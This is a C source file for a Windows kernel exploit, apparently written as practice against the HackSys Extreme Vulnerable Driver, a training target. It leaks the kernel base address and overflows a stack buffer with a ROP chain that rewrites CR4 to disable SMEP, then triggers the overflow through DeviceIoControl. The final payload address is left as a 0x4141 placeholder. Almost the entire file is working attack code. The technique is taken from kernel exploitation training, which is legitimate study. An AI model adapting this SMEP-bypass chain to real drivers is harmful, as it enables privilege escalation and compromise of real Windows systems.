#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_hevd = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0;
	long long pop_rcx_gadget = 0, rcx_cr4_value = 0x70678, mov_cr4_rcx_gadget = 0, kernel_base = 0;
	char unused = 0, output[1024], input[2104];

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	system("title Stack Buffer Overflow SMEP Bypass");

	printf("%s[!] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_hevd == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the \"HackSys Extreme Vulnerable Driver.\" Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"HackSys Extreme Vulnerable Driver.\" Handle Value: 0x%p", h_hevd);

	kernel_base = leak_ntoskrnl_base_address();
	if (!kernel_base)
	{
		return 1;
	}

	pop_rcx_gadget = kernel_base + POP_RCX_OFFSET;
	mov_cr4_rcx_gadget = kernel_base + MOV_CR4_RCX_OFFSET;
	printf("\n[+] Located pop rcx + ret gadget. Gadget Address: 0x%p\n[+] Located mov cr4, rcx + ret gadget. Gadget Address: 0x%p", (long long*)pop_rcx_gadget, (long long*)mov_cr4_rcx_gadget);

	memset(&input, 'A', 2072);
	*(long long*)(input + 2072) = (long long*)pop_rcx_gadget;
	*(long long*)(input + 2080) = rcx_cr4_value;
	*(long long*)(input + 2088) = (long long*)mov_cr4_rcx_gadget;
	*(long long*)(input + 2096) = (long long*)0x4141414141414141; // TODO: Replace with payload address
	printf("\n[+] Crafted input buffer.\n[!] Redirecting code execution to payload address... Payload Address: 0x%p", (long long*)0x4141414141414141);

	Sleep(1000);

	DeviceIoControl(h_hevd, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}